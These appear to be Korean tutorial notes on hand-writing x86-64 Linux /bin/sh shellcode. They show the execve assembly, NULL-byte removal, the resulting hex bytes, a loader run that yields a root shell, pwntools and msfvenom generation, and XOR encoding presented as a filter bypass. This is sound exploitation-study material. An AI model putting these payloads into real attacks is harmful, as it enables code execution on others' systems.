# 실전 셸코드 제작 및 실행 기법 요약 정리

## 셸코드를 직접 작성: /bin/sh 셸코드

### 사용 시스템콜: `execve()`
```c
execve("/bin//sh", ["/bin//sh"], NULL);
```

### 레지스터 할당
- `rax`: 59 (execve syscall 번호)
- `rdi`: "/bin//sh" 문자열의 주소
- `rsi`: 인자 배열 주소 (["/bin//sh"])
- `rdx`: NULL

> **'/bin//sh'에서 //를 넣은 이유:** 총 길이를 8바이트로 맞추기 위함이다. 이는 64비트 레지스터 크기에 딱 맞게 하여, 남은 찌꺼기 처리 없이 그대로 mov 명령어로 레지스터에 넣을 수 있기 때문. Linux에서는 슬래시가 두 개여도 무시되기 때문에 익스플로잇에서 자주 쓰는 트릭이다.

### 기본 어셈블리 코드 예시
```nasm
global _start

section .text
_start:
    mov rax, 59         ; execve 시스템 호출 번호 설정 (execve = 59)
    push 0              ; 문자열 끝을 나타내기 위해 NULL(0) 푸시
    mov rdi, '/bin//sh' ; 첫 번째 인자: 실행할 프로그램 경로 (/bin/sh)
    push rdi            ; 문자열을 스택에 푸시
    mov rdi, rsp        ; rdi에 프로그램 경로의 주소 설정
    push 0              ; 두 번째 인자 배열의 끝을 나타내기 위해 NULL 푸시
    push rdi            ; 두 번째 인자: 인자 배열에 프로그램 경로 주소 푸시
    mov rsi, rsp        ; rsi에 인자 배열의 주소 설정
    mov rdx, 0          ; 환경 변수는 사용하지 않으므로 NULL로 설정
    syscall             ; 시스템 호출 실행 (execve("/bin/sh", ["/bin/sh"], NULL))
```
> 해석하면 **맨 앞바이트가 NULL (0x00) 이 들어가게 됨**.
이 NULL 바이트가 쉘코드 전체를 문자열로 해석하는 도중 조기 종료를 유발해서,
**쉘코드가 중간에 짤려버리는 위험**이 있다.

### 수정된 어셈블리 코드 예시 (NULL 제거 버전)
```nasm
_start:
    mov al, 59          ; execve 시스템 콜 번호 설정 (al = 59)
    xor rdx, rdx        ; rdx를 0으로 초기화 (환경 변수는 NULL로 설정)
    push rdx            ; NULL 문자열 종료자 푸시
    mov rdi, '/bin//sh' ; 실행할 프로그램 경로 '/bin//sh'를 rdi에 저장
    push rdi            ; 스택에 '/bin//sh' 푸시
    mov rdi, rsp        ; rdi를 스택의 현재 위치(= 문자열 시작 주소)로 설정
    push rdx            ; NULL 포인터 푸시 (인자 배열의 끝 표시)
    push rdi            ; '/bin//sh' 문자열 주소 푸시 (인자 배열 시작)
    mov rsi, rsp        ; rsi를 인자 배열의 시작 주소로 설정
    syscall             ; execve("/bin/sh", ["/bin/sh"], NULL) 실행
```

### NULL 제거 버전으로 수정 후 결과:
```bash
$ python3 shellcoder.py sh
b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
27 bytes - No NULL bytes
```

---

## 실행 결과:
```bash
$ python3 loader.py 'b03b48...'
$ whoami
root
```

---

## 자동 셸코드 생성 도구들

### pwntools: shellcraft
```bash
$ pwn shellcraft amd64.linux.sh
```

### 고급 사용:
```python
>>> from pwn import *
>>> shellcode = shellcraft.execve('/bin/sh', ['/bin/sh'])
>>> asm(shellcode).hex()
```

### 실행:
```bash
$ python3 loader.py '<hex 코드>'
$ whoami
root
```

---

### msfvenom
```bash
$ msfvenom -p linux/x64/exec CMD='sh' -f hex
```

### 실행:
```bash
$ python3 loader.py '<생성된 hex 코드>'
$ whoami
root
```

---

## 셸코드 인코딩 (바이패스용)

### 인코딩 예시
```bash
$ msfvenom -p linux/x64/exec CMD='sh' -f hex -e x64/xor
```

- NULL 제거 및 바이패스 가능성 향상
- 하지만 크기는 증가함

### 커스텀 셸코드 인코딩
```bash
$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('<hex>'))" > shell.bin
$ msfvenom -p - -f hex -e x64/xor < shell.bin
```

---

## 온라인 셸코드 리소스
- Shell-Storm: https://shell-storm.org/shellcode/
- Exploit-DB: https://exploit-db.com

예: 최적화된 /bin/sh 셸코드 → 22~27 바이트

---

## 요약
- 셸코드는 간단한 코드가 아님 → 메모리에 직접 로딩, NULL 제거, 크기 최적화 필요
- 직접 작성, 자동 생성 도구(pwntools, msfvenom), 온라인 검색 등 다양한 방식 활용 가능
